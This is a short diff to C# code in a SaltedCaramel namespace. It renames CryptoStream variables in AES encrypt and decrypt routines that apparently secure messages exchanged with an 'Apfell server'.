@@ -19,9 +19,9 @@ namespace SaltedCaramel
                 ICryptoTransform encryptor = scAes.CreateEncryptor(scAes.Key, scAes.IV);
 
                 using (MemoryStream encryptMemStream = new MemoryStream())
-                using (CryptoStream encryptCryptStream = new CryptoStream(encryptMemStream, encryptor, CryptoStreamMode.Write))
+                using (CryptoStream encryptCryptoStream = new CryptoStream(encryptMemStream, encryptor, CryptoStreamMode.Write))
                 {
-                    using (StreamWriter encryptStreamWriter = new StreamWriter(encryptCryptStream))
+                    using (StreamWriter encryptStreamWriter = new StreamWriter(encryptCryptoStream))
                         encryptStreamWriter.Write(plaintext);
                     // We need to send iv:ciphertext
                     byte[] encrypted = scAes.IV.Concat(encryptMemStream.ToArray()).ToArray();
@@ -49,8 +49,8 @@ namespace SaltedCaramel
                 ICryptoTransform decryptor = scAes.CreateDecryptor(scAes.Key, IV);
 
                 using (MemoryStream decryptMemStream = new MemoryStream(ciphertext))
-                using (CryptoStream decryptCryptStream = new CryptoStream(decryptMemStream, decryptor, CryptoStreamMode.Read))
-                using (StreamReader decryptStreamReader = new StreamReader(decryptCryptStream))
+                using (CryptoStream decryptCryptoStream = new CryptoStream(decryptMemStream, decryptor, CryptoStreamMode.Read))
+                using (StreamReader decryptStreamReader = new StreamReader(decryptCryptoStream))
                 {
                     string decrypted = decryptStreamReader.ReadToEnd();
                     // Return decrypted message from Apfell server
